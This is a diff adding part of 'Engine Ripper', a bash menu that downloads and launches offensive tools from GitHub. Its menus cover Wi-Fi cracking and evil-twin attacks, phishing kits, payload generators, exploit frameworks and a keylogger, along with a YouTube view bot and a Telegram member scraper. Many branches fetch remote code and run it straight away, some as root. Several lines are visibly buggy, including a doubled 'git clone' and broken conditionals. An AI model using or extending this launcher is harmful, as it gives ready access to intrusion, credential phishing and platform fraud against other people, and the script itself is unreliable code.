+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 17 ]]; then
+printf "\n\nDownloading rang3r from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/floriankunushevci/rang3r
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+read -p $'\n\e[1;92mEnter IP Address: ' input_ip
+cd rang3r
+python rang3r.py --ip $input_ip
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 18 ]]; then
+printf "\n\nDownloading Breacher from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/s0md3v/Breacher
+printf "\n\n\e[1;92mFile Saved to \e[1;94m"
+pwd
+printf "\n\e[1;92mPlease install setup manually!\n"
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+information_gathering_tools_L
+elif [[ $input == 19 ]]; then
+printf "\n\nDownloading fsociety from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/fsociety
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd fsociety
+bash install.sh
+fsociety
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 20 ]]; then
+printf "\n\nDownloading /opt/discover/ from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone git clone https://github.com/leebaird/discover /opt/discover/
+printf "\n\n\e[1;92mFile saved as \e[1;94m/opt/discover\e[1;92m!\nPlease use it manually!\n"
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+information_gathering_tools_L
+elif [[ $input == 21 ]]; then
+printf "\n\nDownloading Reccoon from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/evyatarmeged/Raccoon
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd Raccoon
+python3 setup.py install
+raccoon --help
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 22 ]]; then
+printf "\n\nDownloading sandmap from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/trimstray/sandmap
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+chmod +x sandmap/setup.sh
+cd sandmap
+./setup.sh install
+sandmap
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 23 ]]; then
+printf "\n\nDownloading OSIF from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/ciku370/OSIF
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+pip2 install -r OSIF/requirements.txt
+python2 OSIF/osif.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+information_gathering_tools_L
+else
+information_gathering_tools_L
+fi
+elif [[ $input == 24 ]]; then
+printf "\n\nDownloading CoronaStats from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/CoronaStats.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install php curl git wget -y
+bash CoronaStats/coronastats.sh
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+information_gathering_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install php curl git wget -y
+bash CoronaStats/coronastats.sh
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+information_gathering_tools_L
+else
+error_handle
+fi
+else
+information_gathering_tools_L
+fi
+else
+command_not_found
+fi
+}
+wordlist_generators_L() {
+clear
+printf "\n\e[1;92mWordlist Generators:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Cupp\n"
+printf "[\e[1;93m2\e[1;92m] WordlistCreator\n"
+printf "[\e[1;93m3\e[1;92m] Goblin WordGenerator\n"
+printf "[\e[1;93m4\e[1;92m] SMWYG-Show-Me-What-You-Got {Password list (1.4 Billion Clear Text Password)}\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+elif [[ $input == 1 || $input == 01 ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+else
+error_handle
+press_enter
+wordlist_generators_L
+fi
+printf "\n\nDownloading cupp from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/Mebus/cupp
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd cupp
+python3 cupp.py -h
+press_enter
+cd ..
+wordlist_generators_L
+else
+wordlist_generators_L
+fi
+elif [[ $input == 2 || $input == 02 ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+else
+error_handle
+press_enter
+wordlist_generators_L
+fi
+printf "\n\nDownloading Wordlist-Generator from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/G0uth4m/Wordlist-Generator
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd Wordlist-Generator
+python3 wordGenerator.py
+press_enter
+cd ..
+wordlist_generators_L
+else
+wordlist_generators_L
+fi
+elif [[ $input == 3 || $input == 03 ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+else
+error_handle
+press_enter
+wordlist_generators_L
+fi
+printf "\n\nDownloading GoblinWordGenerator from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/UndeadSec/GoblinWordGenerator
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd GoblinWordGenerator
+python3 goblin.py
+press_enter
+cd ..
+wordlist_generators_L
+else
+wordlist_generators_L
+fi
+elif [[ $input == 4 || $input == 04 ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+else
+error_handle
+press_enter
+wordlist_generators_L
+fi
+printf "\n\nDownloading SMWYG-Show-Me-What-You-Got from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/Viralmaniar/SMWYG-Show-Me-What-You-Got
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd SMWYG-Show-Me-What-You-Got
+pip3 install -r requirements.txt
+python3 SMWYG.py
+press_enter
+cd ..
+wordlist_generators_L
+else
+wordlist_generators_L
+fi
+else
+command_not_found
+fi
+}
+wireless_attack_tools_L() {
+clear
+printf "\n\e[1;92mWireless attack tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] WiFi-Pumpkin\n"
+printf "[\e[1;93m2\e[1;92m] pixiewps\n"
+printf "[\e[1;93m3\e[1;92m] Bluetooth Honeypot GUI Framework\n"
+printf "[\e[1;93m4\e[1;92m] Fluxion\n"
+printf "[\e[1;93m5\e[1;92m] Wifiphisher\n"
+printf "[\e[1;93m6\e[1;92m] Wifite\n"
+printf "[\e[1;93m7\e[1;92m] Wifite2\n"
+printf "[\e[1;93m8\e[1;92m] EvilTwin\n"
+printf "[\e[1;93m9\e[1;92m] Fastssh\n"
+printf "[\e[1;93m10\e[1;92m] aircrack-ng\n"
+printf "[\e[1;93m11\e[1;92m] kismet\n"
+printf "[\e[1;93m12\e[1;92m] mdk3\n"
+printf "[\e[1;93m13\e[1;92m] mfoc\n"
+printf "[\e[1;93m14\e[1;92m] reaver\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+elif [[ $input == 1 || $input == 01 ]]; then
+printf "\n\nDownloading WiFi-Pumpkin from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git
+cd WiFi-Pumpkin
+chmod +x installer.sh
+./installer.sh --install
+cd ..
+press_enter
+wireless_attack_tools_L
+elif [[ $input == 2 || $input == 02 ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install build-essential -y
+elif [ "$LINUX" = true ]; then
+sudo apt install build-essential -y
+else
+error_handle
+press_enter
+wireless_attack_tools_L
+fi
+printf "\n\nDownloading pixiewps from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/wiire/pixiewps
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd pixiewps
+make
+sudo make install
+pixiewps -h
+press_enter
+cd ..
+wireless_attack_tools_L
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 3 || $input == 03 ]]; then
+wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz
+tar xfz bluepot-0.1.tar.gz
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+sudo java -jar bluepot/BluePot-0.1.jar
+press_enter
+wireless_attack_tools_L
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 4 || $input == 04 ]]; then
+git clone https://www.github.com/FluxionNetwork/fluxion.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd fluxion
+./fluxion.sh
+press_enter
+cd ..
+wireless_attack_tools_L
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 5 || $input == 05 ]]; then
+git clone https://github.com/wifiphisher/wifiphisher.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd wifiphisher
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+sudo python3 setup.py install
+elif [[ "$LINUX" = true ]]; then
+sudo apt install python3 python3-pip -y
+sudo python3 setup.py install
+else
+error_handle
+cd ..
+press_enter
+wireless_attack_tools_L
+fi
+wifiphisher
+press_enter
+cd ..
+wireless_attack_tools_L
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 6 || $input == 06 ]]; then
+wget https://raw.github.com/derv82/wifite/master/wifite.py
+chmod +x wifite.py
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+if [ "TERMUX" = true ]; then
+pkg install python2 -y
+./wifite.py
+press_enter
+wireless_attack_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python2 -y
+press_enter
+wireless_attack_tools_L
+./wifite.py
+else
+error_handle
+wireless_attack_tools_L
+fi
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 7 || $input == 07 ]]; then
+git clone https://github.com/derv82/wifite2.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd wifite2
+if [ "$TERMUX" = true ]; then
+pkg install python tsu -y
+sudo python3 setup.py install
+cd ..
+wifite
+wireless_attack_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+sudo python3 setup.py install
+cd ..
+wifite
+wireless_attack_tools_L
+else
+error_handle
+cd ..
+press_enter
+wireless_attack_tools_L
+fi
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 8 || $input == 08 ]]; then
+git clone https://github.com/ShlomiRex/WiFi-EvilTwin
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd WiFi-EvilTwin
+if [ "$TERMUX" = true ]; then
+printf "\n\n\e[1;91mSorry, This tool is not for Termux!\n\e[1;92m"
+press_enter
+cd ..
+wireless_attack_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+chmod +x *
+./setup.sh
+python3 console.py
+press_enter
+cd ..
+wireless_attack_tools_L
+else
+error_handle
+cd ..
+press_enter
+wireless_attack_tools_L
+fi
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 9 || $input == 09 ]]; then
+git clone https://github.com/thelinuxchoice/fastssh
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd fastssh
+if [ "$TERMUX" = true ]; then
+apt-get install -y sshpass netcat
+chmod +x fastssh.sh
+./fastssh.sh
+press_enter
+cd ..
+wireless_attack_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt-get install -y sshpass netcat
+chmod +x fastssh.sh
+./fastssh.sh
+press_enter
+cd ..
+wireless_attack_tools_L
+else
+error_handle
+cd ..
+press_enter
+wireless_attack_tools_L
+fi
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 10 ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install aircrack-ng -y
+elif [ "$LINUX" = true ]; then
+sudo apt install aircrack-ng -y
+else
+error_handle
+press_enter
+wireless_attack_tools_L
+fi
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+aircrack-ng -h
+press_enter
+wireless_attack_tools_L
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 11 ]]; then
+if [ "$TERMUX" = true ]; then
+apt install kismet -y
+elif [ "$LINUX" = true ]; then
+sudo apt install kismet -y
+else
+error_handle
+press_enter
+wireless_attack_tools_L
+fi
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open ]]; then
+kismet -h
+press_enter
+wireless_attack_tools_L
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 12 ]]; then
+git clone https://github.com/aircrack-ng/mdk4
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd mdk4
+if [ "$TERMUX" = true ]; then
+pkg install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev -y
+make
+make install
+mdk4 --fullhelp
+elif [ "$LINUX" = true ]; then
+sudo apt-get install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev -y
+make
+sudo make install
+mdk4 --fullhelp
+else
+error_handle
+press_enter
+cd ..
+wireless_attack_tools_L
+fi
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 13 ]]; then
+git clone https://github.com/nfc-tools/mfoc
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd mfoc
+if [ "$TERMUX" = true ]; then
+autoreconf -is
+./configure
+make && make install
+press_enter
+cd ..
+wireless_attack_tools_L
+elif [ "$LINUX" = true ]; then
+autoreconf -is
+./configure
+make && sudo make install
+press_enter
+cd ..
+wireless_attack_tools_L
+else
+error_handle
+press_enter
+cd ..
+wireless_attack_tools_L
+fi
+else
+wireless_attack_tools_L
+fi
+elif [[ $input == 14 ]]; then
+if [ "$TERMUX" = true ]; then
+pkg install reaver -y
+reaver -h
+press_enter
+wireless_attack_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install reaver -y
+reaver -h
+press_enter
+wireless_attack_tools_L
+else
+error_handle
+press_enter
+wireless_attack_tools_L
+fi
+else
+command_not_found
+fi
+}
+sql_injection_tools_L() {
+clear
+printf "\n\e[1;92mSQL Injection Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Sqlmap tool\n"
+printf "[\e[1;93m2\e[1;92m] NoSqlMap\n"
+printf "[\e[1;93m3\e[1;92m] DSSS (Damn Small SQLi Scanner)\n"
+printf "[\e[1;93m4\e[1;92m] Explo\n"
+printf "[\e[1;93m5\e[1;92m] Blisqy - Exploit Time-based blind-SQL injection\n"
+printf "[\e[1;93m6\e[1;92m] Leviathan - Wide Range Mass Audit Toolkit\n"
+printf "[\e[1;93m7\e[1;92m] SQLScan\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+phishing_attack_tools_L() {
+clear
+printf "\n\e[1;92mPhishing attack tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Setoolkit\n"
+printf "[\e[1;93m2\e[1;92m] SocialFish\n"
+printf "[\e[1;93m3\e[1;92m] ShellPhish\n"
+printf "[\e[1;93m4\e[1;92m] HiddenEye\n"
+printf "[\e[1;93m5\e[1;92m] Zphisher\n"
+printf "[\e[1;93m6\e[1;92m] Evilginx2\n"
+printf "[\e[1;93m7\e[1;92m] I-See_You (Get Location using phishing attack)\n"
+printf "[\e[1;93m8\e[1;92m] SayCheese (Grab target's Webcam Shots)\n"
+printf "[\e[1;93m9\e[1;92m] ohmyqr (QR Code Jacking)\n"
+printf "[\e[1;93m10\e[1;92m] BlackPhish\n"
+printf "[\e[1;93m11\e[1;92m] Phishing.Database\n"
+printf "[\e[1;93m12\e[1;92m] PhishingKitHunter\n"
+printf "[\e[1;93m13\e[1;92m] Recreator-Phishing\n"
+printf "[\e[1;93m14\e[1;92m] Nexphisher\n"
+printf "[\e[1;93m15\e[1;92m] Advphishing\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+web_attack_tools_L() {
+clear
+printf "\n\e[1;92mWeb Attack Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Web2Attack\n"
+printf "[\e[1;93m2\e[1;92m] Sublist3r (SubDomain Finder)\n"
+printf "[\e[1;93m3\e[1;92m] CheckURL\n"
+printf "[\e[1;93m4\e[1;92m] Blazy(Also Find ClickJacking)\n"
+printf "[\e[1;93m5\e[1;92m] takeover (Sub-Domain TakeOver)\n"
+printf "[\e[1;93m6\e[1;92m] Dirb\n"
+printf "[\e[1;93m7\e[1;92m] pixload (Web Attack Payload)\n"
+printf "[\e[1;93m8\e[1;92m] payloads (Web Attack Payloads)\n"
+printf "[\e[1;93m9\e[1;92m] TelegramScraper (Telegram Members Scrapping Tool)\n"
+printf "[\e[1;93m10\e[1;92m] Visify (Auto Web Page Visiting Tool, For Termux Only)\n"
+printf "[\e[1;93m11\e[1;92m] YouTube_Views_Bot\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+elif [[ $input == 9 ]]; then
+printf "\n\nDownloading TelegramScraper from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/TelegramScraper
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+cd TelegramScraper
+python3 setup.py
+python3 scraper.py
+python3 adder.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+web_attack_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3
+cd TelegramScraper
+python3 setup.py
+python3 scraper.py
+python3 adder.py
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+web_attack_tools_L
+else
+error_handle
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+web_attack_tools_L
+fi
+else
+web_attack_tools_L
+fi
+elif [[ $input == 10 ]]; then
+printf "\n\nDownloading Visify from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/Visify
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+if [ "$TERMUX" = true ]; then
+cd Visify
+pkg install php -y
+php visify.php
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+web_attack_tools_L
+elif [[ "$LINUX" = true ]]; then
+printf "\n\n\e[1;91mSorry, This tool is not for Linux OS\n\e[1;92m"
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+web_attack_tools_L
+else
+error_handle
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+web_attack_tools_L
+fi
+else
+web_attack_tools_L
+fi
+elif [[ $input == 11 ]]; then
+printf "\n\nDownloading YouTube_Views_Bot from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/YouTube_Views_Bot
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\n\e[1;91mWarnning!\n\e[1;92mThis tool will not work in sock proxy!\n\nPlease wait ...\n"
+sleep 8
+cd YouTube_Views_Bot
+bash setup.sh
+python3 bot.py --help
+read -p $'\n\n\e[1;92mClick ENTER to continue to Engine Ripper ... ' click_enter
+cd ..
+web_attack_tools_L
+else
+web_attack_tools_L
+fi
+else
+command_not_found
+fi
+}
+post_exploitation_tools_L() {
+clear
+printf "\n\e[1;92mPost exploitation tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Vegile - Ghost In The Shell\n"
+printf "[\e[1;93m2\e[1;92m] HeraKeylogger (Vegile - Ghost In The Shell)\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+forensic_tools_L() {
+clear
+printf "\n\e[1;92mForensic tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Bulk extractor\n"
+printf "[\e[1;93m2\e[1;92m] urlRecon\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+payload_creation_tools_L() {
+clear
+printf "\n\e[1;92mPayload creation tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] The FatRat\n"
+printf "[\e[1;93m2\e[1;92m] Brutal\n"
+printf "[\e[1;93m3\e[1;92m] Stitch\n"
+printf "[\e[1;93m4\e[1;92m] msfpc (MSFvenom Payload Creator)\n"
+printf "[\e[1;93m5\e[1;92m] venom (Venom Shellcode Generator)\n"
+printf "[\e[1;93m6\e[1;92m] Spycam\n"
+printf "[\e[1;93m7\e[1;92m] Mob-Droid\n"
+printf "[\e[1;93m8\e[1;92m] Enigma\n"
+printf "[\e[1;93m9\e[1;92m] Iscript\n"
+printf "[\e[1;93m10\e[1;92m] ehtools\n"
+printf "[\e[1;93m11\e[1;92m] KitHack\n"
+printf "[\e[1;93m12\e[1;92m] XSS-LOADER\n"
+printf "[\e[1;93m13\e[1;92m] BackToMe\n"
+printf "[\e[1;93m14\e[1;92m] MetaSploit Framework\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+exploit_framework_L() {
+clear
+printf "\n\e[1;92mExploit frameworks:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] RouterSploit\n"
+printf "[\e[1;93m2\e[1;92m] WebSploit\n"
+printf "[\e[1;93m3\e[1;92m] Commix\n"
+printf "[\e[1;93m4\e[1;92m] ghost\n"
+printf "[\e[1;93m5\e[1;92m] Exploit-Framework\n"
+printf "[\e[1;93m6\e[1;92m] Tentacle\n"
+printf "[\e[1;93m7\e[1;92m] beef\n"
+printf "[\e[1;93m8\e[1;92m] MetaSploit Framework\n"
+printf "[\e[1;93m9\e[1;92m] searchsploit\n"
+printf "[\e[1;93m0\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+elif [[ $input == 1 ]]; then
+printf "\n\nDownloading RouterSploit from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/threat9/routersploit
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+cd routersploit
+if [ "$TERMUX" = true ]; then
+pkg install python libglib2.0-dev -y
+python3 -m pip install -r requirements.txt
+python3 -m pip install bluepy
+python3 rsf.py
+press_enter
+cd ..
+exploit_framework_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip libglib2.0-dev -y
+python3 -m pip install -r requirements.txt
+python3 -m pip install bluepy
+python3 rsf.py
+press_enter
+cd ..
+exploit_framework_L
+else
+error_handle
+cd ..
+press_enter
+fi
+else
+exploit_framework_L
+fi
+elif [[ $input == 2 ]]; then
+printf "\n\nDownloading WebSploit from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/websploit/websploit.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+cd websploit
+if [ "$TERMUX" = true ]; then
+pkg install python git wget -y
+python3 setup.py install
+websploit
+press_enter
+cd ..
+exploit_framework_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip git wget -y
+python3 setup.py install
+websploit
+press_enter
+cd ..
+exploit_framework_L
+else
+error_handle
+cd ..
+press_enter
+exploit_framework_L
+fi
+else
+exploit_framework_L
+fi
+elif [[ $input == 3 ]]; then
+printf "\n\nDownloading Commix from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/commixproject/commix
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+cd commix
+if [ "$TERMUX" = true ]; then
+pkg install python git -y
+python3 setup.py
+python commix.py -h
+press_enter
+cd ..
+exploit_framework_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip git -y
+python3 setup.py
+python commix.py -h
+press_enter
+cd ..
+exploit_framework_L
+else
+error_handle
+press_enter
+cd ..
+exploit_framework_L
+fi
+else
+exploit_framework_L
+fi
+elif [[ $input == 4 ]]; then
+printf "\n\nDownloading Ghost from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/EntySec/ghost
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+cd ghost
+chmod +x install.sh
+./install.sh
+press_enter
+cd ..
+exploit_framework_L
+else
+exploit_framework_L
+fi
+elif [[ $input == 5 ]]; then
+printf "\n\nDownloading Exploit-Framework from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/WangYihang/Exploit-Framework
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+cd Exploit-Framework
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+python3 framework.py
+cd ..
+press_enter
+exploit_framework_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 -y
+python3 framework.py
+cd ..
+press_enter
+exploit_framework_L
+else
+error_handle
+press_enter
+cd ..
+exploit_framework_L
+fi
+else
+exploit_framework_L
+fi
+elif [[ $input == 6 ]]; then
+printf "\n\nDownloading Tentacle from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/mdiep/Tentacle
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+printf "\n\e[1;92mPlease setup your tool manually !!\n"
+printf "I can't help you with that.\n"
+else
+exploit_framework_L
+fi
+elif [[ $input == 7 ]]; then
+printf "\n\nDownloading beef from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/beefproject/beef
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+printf "\n\e[1;92mPlease setup your tool manually !!\n"
+printf "I can't help you with that.\n"
+else
+exploit_framework_L
+fi
+elif [[ $input == 8 ]]; then
+printf "\n\nDownloading metasploit-framework from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/rapid7/metasploit-framework
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+printf "\n\e[1;92mPlease setup your tool manually !!\n"
+printf "I can't help you with that.\n"
+else
+exploit_framework_L
+fi
+elif [[ $input == 9 ]]; then
+printf "\n\nDownloading CVE SearchSploit from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/andreafioraldi/cve_searchsploit
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[1;92mChecking ...\n"
+sleep 1
+cd cve_searchsploit
+if [ "$TERMUX" = true ]; then
+pkg install python -y
+pip3 install cve_searchsploit
+python3 setup.py install
